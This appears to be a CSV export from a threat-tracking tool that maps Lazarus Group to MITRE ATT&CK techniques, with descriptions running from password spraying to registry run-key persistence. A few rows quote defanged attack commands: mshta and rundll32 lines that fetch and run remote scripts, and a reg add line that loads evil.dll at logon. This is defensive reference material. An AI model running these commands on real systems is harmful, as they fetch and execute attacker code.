T1110.003,Password Spraying,Credential-Access,Pending,alerts\Lazarus_Group\T1110.003_Password_Spraying.html,,APT Matrix Generator,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)  Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:  * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP)  In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)  In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",https://attack.mitre.org/techniques/T1110/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1124,System Time Discovery,Discovery,Pending,alerts\Lazarus_Group\T1124_System_Time_Discovery.html,,APT Matrix Generator,"An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)  System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)  On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.  In addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)  This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",https://attack.mitre.org/techniques/T1124/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1132.001,Standard Encoding,Command-And-Control,Pending,alerts\Lazarus_Group\T1132.001_Standard_Encoding.html,,APT Matrix Generator,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",https://attack.mitre.org/techniques/T1132/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1134.002,Create Process with Token,"Defense-Evasion, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1134.002_Create_Process_with_Token.html,,APT Matrix Generator,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)  Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.  While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",https://attack.mitre.org/techniques/T1134/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1140,Deobfuscate/Decode Files or Information,Defense-Evasion,Pending,alerts\Lazarus_Group\T1140_DeobfuscateDecode_Files_or_Information.html,,APT Matrix Generator,Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.  One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)  Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016),https://attack.mitre.org/techniques/T1140/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1189,Drive-by Compromise,Initial-Access,Pending,alerts\Lazarus_Group\T1189_Drive-by_Compromise.html,,APT Matrix Generator,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:  * A legitimate website is compromised, allowing adversaries to inject malicious code * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008)) * Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)  Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking ""allow"" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)  Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)  Typical drive-by compromise process:  1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes. 3. Upon finding a vulnerable version, exploit code is delivered to the browser. 4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.  Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",https://attack.mitre.org/techniques/T1189/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1202,Indirect Command Execution,Defense-Evasion,Pending,alerts\Lazarus_Group\T1202_Indirect_Command_Execution.html,,APT Matrix Generator,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)  Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",https://attack.mitre.org/techniques/T1202/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1203,Exploitation for Client Execution,Execution,Pending,alerts\Lazarus_Group\T1203_Exploitation_for_Client_Execution.html,,APT Matrix Generator,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.  Several types exist:  ### Browser-based Exploitation  Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.  ### Office Applications  Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.  ### Common Third-party Applications  Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",https://attack.mitre.org/techniques/T1203/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1204.002,Malicious File,Execution,Pending,alerts\Lazarus_Group\T1204.002_Malicious_File.html,,APT Matrix Generator,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.  Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs)   While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",https://attack.mitre.org/techniques/T1204/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1218,System Binary Proxy Execution,Defense-Evasion,Pending,alerts\Lazarus_Group\T1218_System_Binary_Proxy_Execution.html,,APT Matrix Generator,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.  Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",https://attack.mitre.org/techniques/T1218/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1218.005,Mshta,Defense-Evasion,Pending,alerts\Lazarus_Group\T1218.005_Mshta.html,,APT Matrix Generator,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)   Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)  Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",https://attack.mitre.org/techniques/T1218/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1218.011,Rundll32,Defense-Evasion,Pending,alerts\Lazarus_Group\T1218.011_Rundll32.html,,APT Matrix Generator,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).  Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",https://attack.mitre.org/techniques/T1218/011/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1485,Data Destruction,Impact,Pending,alerts\Lazarus_Group\T1485_Data_Destruction.html,,APT Matrix Generator,"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.  Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).  In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.",https://attack.mitre.org/techniques/T1485/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1489,Service Stop,Impact,Pending,alerts\Lazarus_Group\T1489_Service_Stop.html,,APT Matrix Generator,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster)   Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",https://attack.mitre.org/techniques/T1489/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1491.001,Internal Defacement,Impact,Pending,alerts\Lazarus_Group\T1491.001_Internal_Defacement.html,,APT Matrix Generator,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)",https://attack.mitre.org/techniques/T1491/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1529,System Shutdown/Reboot,Impact,Pending,alerts\Lazarus_Group\T1529_System_ShutdownReboot.html,,APT Matrix Generator,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.  Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.  Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",https://attack.mitre.org/techniques/T1529/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1542.003,Bootkit,"Defense-Evasion, Persistence",Pending,alerts\Lazarus_Group\T1542.003_Bootkit.html,,APT Matrix Generator,"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.  In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)  The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.  In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",https://attack.mitre.org/techniques/T1542/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1543.003,Windows Service,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1543.003_Windows_Service.html,,APT Matrix Generator,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.  Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.   Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)  Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).  To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",https://attack.mitre.org/techniques/T1543/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1547.001,Registry Run Keys / Startup Folder,"Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1547.001_Registry_Run_Keys__Startup_Folder.html,,APT Matrix Generator,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.  The following run keys are created by default on Windows systems:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)  Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder 